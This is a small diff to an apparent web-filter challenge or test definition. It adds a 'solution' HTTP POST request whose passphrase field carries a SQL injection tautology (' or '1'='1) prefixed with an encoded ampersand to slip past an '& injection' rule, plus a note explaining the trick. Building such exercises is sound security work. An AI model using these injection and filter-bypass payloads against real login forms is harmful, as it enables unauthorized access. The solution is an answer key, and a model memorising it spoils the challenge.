@@ -17,6 +17,16 @@ base_request: |-
 
   passphrase=' or '1'='1
 
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Content-Length: 25
+  Content-Type: application/x-www-form-urlencoded
+
+  passphrase=%26' or '1'='1
+
+solution_note: Add an ampersand (%26) before the '
+
 rules:
 # & injection
 - >
